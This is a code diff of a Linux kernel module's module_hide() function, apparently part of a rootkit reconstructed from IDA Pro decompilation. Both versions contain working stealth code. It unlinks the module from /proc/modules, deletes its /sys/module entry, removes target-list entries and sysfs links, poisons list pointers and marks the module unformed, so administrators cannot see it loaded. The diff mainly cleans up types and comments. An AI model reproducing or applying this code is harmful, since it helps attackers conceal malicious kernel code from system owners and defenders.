@@ -154,65 +154,65 @@ void module_hide(void) {
     notes_attrs_bkp = THIS_MODULE->notes_attrs;
 
     // Remove from /proc/modules
-    if (list_del_entry_valid(&THIS_MODULE->list)) { // Check if deletion is valid
-        list_head *next = THIS_MODULE->list.next;
-        list_head *prev = THIS_MODULE->list.prev;
-        next->prev = prev; // Update previous node's next pointer
-        prev->next = next; // Update next node's previous pointer
+    if (list_del_entry_valid(&THIS_MODULE->list)) {
+        struct list_head *next = THIS_MODULE->list.next;
+        struct list_head *prev = THIS_MODULE->list.prev;
+        next->prev = prev;
+        prev->next = next;
     }
-    
-    // Set the module's list to point to itself (prevents accidental re-insertion)
+
+    // Set the module's list to point to itself
     THIS_MODULE->list.next = &THIS_MODULE->list;
     THIS_MODULE->list.prev = &THIS_MODULE->list;
 
     // Remove from /sys/module
     kobject_del(&THIS_MODULE->mkobj.kobj);
 
-    // Hide module from target list (additional cleanup from IDA Pro)
-    list_head *v4 = THIS_MODULE->target_list.next;
+    // Hide module from target list
+    struct list_head *v4 = THIS_MODULE->target_list.next;
     if (v4 != &THIS_MODULE->target_list) {
         do {
-            module *v5 = (module *)v4->next;
-            if (list_del_entry_valid(&v4[-1])) { // Validate before deletion
-                list_head *v7 = v4[-1].next;
-                list_head *v6 = v4[-1].prev;
+            struct module *v5 = (struct module *)v4->next;
+            if (list_del_entry_valid(&v4[-1])) {
+                struct list_head *v7 = v4[-1].next;
+                struct list_head *v6 = v4[-1].prev;
                 v7->prev = v6;
                 v6->next = v7;
             }
-            v4[-1].next = (list_head *)0xDEAD000000000100LL;
-            v4[-1].prev = (list_head *)0xDEAD000000000122LL;
-            if (list_del_entry_valid(v4)) { // Validate before deletion
-                list_head *v9 = v4->next;
-                list_head *v8 = v4->prev;
+            v4[-1].next = (struct list_head *)0xDEAD000000000100LL;
+            v4[-1].prev = (struct list_head *)0xDEAD000000000122LL;
+            if (list_del_entry_valid(v4)) {
+                struct list_head *v9 = v4->next;
+                struct list_head *v8 = v4->prev;
                 v9->prev = v8;
                 v8->next = v9;
             }
-            list_head *v10 = v4[1].prev;
-            v4->next = (list_head *)0xDEAD000000000100LL;
-            v4->prev = (list_head *)0xDEAD000000000122LL;
-            sysfs_remove_link(v10[15].next, THIS_MODULE->name); // Remove sysfs link
-            kfree(&v4[-1]); // Free memory allocated for the entry
-            v4 = (list_head *)v5;
-        } while (v5 != (module *)&THIS_MODULE->target_list);
+            struct list_head *v10 = v4[1].prev;
+            v4->next = (struct list_head *)0xDEAD000000000100LL;
+            v4->prev = (struct list_head *)0xDEAD000000000122LL;
+            sysfs_remove_link(v10[15].next, THIS_MODULE->name);
+            kfree(&v4[-1]);
+            v4 = (struct list_head *)v5;
+        } while (v5 != (struct module *)&THIS_MODULE->target_list);
     }
 
-    // Ensure module is properly hidden from module list again
+    // Ensure module is properly hidden
     if (list_del_entry_valid(&THIS_MODULE->list)) {
-        list_head *v12 = THIS_MODULE->list.next;
-        list_head *v11 = THIS_MODULE->list.prev;
+        struct list_head *v12 = THIS_MODULE->list.next;
+        struct list_head *v11 = THIS_MODULE->list.prev;
         v12->prev = v11;
         v11->next = v12;
     }
 
     // Further obfuscate module entry
-    THIS_MODULE->list.prev = (list_head *)0xDEAD000000000122LL;
-    THIS_MODULE->state = MODULE_STATE_UNFORMED; // Change state to prevent loading
+    THIS_MODULE->list.prev = (struct list_head *)0xDEAD000000000122LL;
+    THIS_MODULE->state = MODULE_STATE_UNFORMED;
 
-    // Nullify attributes to prevent crashes on access
+    // Nullify attributes to prevent crashes
     THIS_MODULE->sect_attrs = NULL;
     THIS_MODULE->notes_attrs = NULL;
 
-    module_hidden = (unsigned int)0x1; // Mark module as hidden
+    module_hidden = 1; // Mark module as hidden
 }
 
 int __init driver_entry(void) {
